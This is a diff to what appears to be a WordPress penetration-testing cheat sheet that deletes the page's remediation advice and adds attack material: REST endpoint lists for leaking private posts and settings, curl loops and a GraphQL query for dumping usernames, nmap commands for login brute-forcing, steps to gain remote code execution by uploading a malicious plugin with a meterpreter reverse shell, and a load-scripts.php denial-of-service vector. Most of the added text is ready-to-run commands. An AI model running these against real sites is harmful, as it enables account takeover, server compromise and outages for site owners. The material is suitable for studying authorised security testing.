@@ -63,10 +63,83 @@ curl -s https://$TARGET/xmlrpc.php -d \
 <param><value>https://'"$TARGET"'/?p=1</value></param></params></methodCall>'
 ```
 
-## :material-shield-check: Remediation
+## :material-api: REST / wp-json endpoint hitlist
 
-- Patch/remove unused plugins & themes; run a WAF; disable `xmlrpc.php` and REST
-  user enumeration; enforce 2FA and strong admin passwords.
+Beyond user enum, walk the REST API for leaky settings, private content, and plugin
+routes:
+
+```text
+/wp-json/                          # route index — reveals installed plugin namespaces
+/wp-json/wp/v2/settings            # may leak config if auth is broken
+/wp-json/wp/v2/media
+/wp-json/wp/v2/posts?status=any    # drafts/private posts if authz is weak
+/wp-json/wp/v2/pages?status=private
+/wp-json/wordfence/v1/config       # security-plugin config
+/wp-json/elementor/v1/system-info  # page-builder environment info
+```
+
+## :material-account-multiple: User enumeration — more vectors
+
+Beyond `/wp-json/wp/v2/users` and `?author=1`:
+
+```bash
+# author-id sweep (301 Location / "View all posts by" leak the login)
+for i in $(seq 1 100); do
+  curl -s -L -i "https://$TARGET/?author=$i" | grep -Eo 'author/[a-z0-9._-]+' | head -1
+done | sort -u
+```
+
+```text
+# REST route form (bypasses some ?author blocks)
+https://$TARGET/?rest_route=/wp/v2/users
+# RDF feed exposes dc:creator
+https://$TARGET/feed/rdf/     /search/feed/rss2/     /search/<char>/feed/rss2/
+# Default search may surface author meta tags
+?s=author     ?s=by        (search param may be renamed)
+```
+
+```http
+# wp-graphql plugin — POST /graphql leaks all users
+POST /graphql HTTP/1.1
+Host: $TARGET
+
+{"query":"{ users { nodes { id name } } }"}
+```
+
+Note: WordPress login/reset messages differ by whether the user exists — another
+oracle. See [WPGraphQL docs](https://www.wpgraphql.com/docs/users/).
+
+## :material-folder-open: Directory indexing & path leaks
+
+```text
+# If these list contents ("Index of"), plugin/theme/version enum is trivial:
+/wp-content/   /wp-content/plugins/   /wp-content/themes/   /uploads/
+# Internal absolute paths leaked via direct includes:
+/wp-includes/class-wp-xmlrpc-server.php   /wp-includes/functions.php
+/wp-includes/ms-settings.php   /wp-includes/rss.php   /wp-includes/template-loader.php
+```
+
+## :material-tools: nmap NSE & plugin RCE
+
+```bash
+# Enumerate users + brute logins via NSE
+nmap -sV --script http-wordpress-enum --script-args limit=100 $TARGET
+nmap -p80 --script http-wordpress-brute $TARGET
+# List supported XML-RPC methods
+nmap --script xmlrpc-methods.nse --script-args "xmlrpc-methods.url=https://$TARGET/xmlrpc.php" $TARGET
+```
+
+- **Admin → RCE via malicious plugin:** build a payload plugin with
+  [malicious-wordpress-plugin](https://github.com/wetw0rk/malicious-wordpress-plugin),
+  upload as a new plugin, activate, then hit its PHP path with a metasploit
+  `php/meterpreter/reverse_tcp` listener.
+
+## :material-alert-octagon: Load-script DoS
+
+`/wp-admin/load-scripts.php` (and `load-styles.php`) will concatenate an
+attacker-supplied list of ~181 core scripts in one request — large response, high
+server cost, amplifiable into DoS. Reference:
+[Barak Tawily's write-up](https://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html).
 
 ## :material-link-variant: Related
 
